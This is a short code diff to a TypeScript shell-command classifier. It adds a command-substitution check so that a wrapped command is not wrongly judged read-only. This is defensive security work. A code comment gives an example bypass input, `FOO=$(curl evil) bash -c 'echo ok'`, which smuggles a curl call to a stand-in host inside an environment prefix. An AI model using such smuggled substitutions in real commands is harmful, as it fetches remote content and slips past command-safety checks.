@@ -295,6 +295,18 @@ function evaluateShellSegment(segment: string): boolean {
     return true;
   }
 
+  // Substitution check BEFORE stripShellWrapper: a leading
+  // env-prefix like `FOO=$(curl evil) bash -c 'echo ok'` would have
+  // its substitution-bearing env tokens discarded by
+  // `stripShellWrapper`, leaving a substitution-free `echo ok` that
+  // this fallback would then classify as read-only. Checking the raw
+  // segment first keeps the regex-fallback path in lockstep with the
+  // AST path (`evaluateStatementReadOnly`) and the L3 gates added in
+  // PR #4386 R6 (cid 3298521039).
+  if (detectCommandSubstitution(segment)) {
+    return false;
+  }
+
   const stripped = stripShellWrapper(segment);
   if (!stripped) {
     return true;
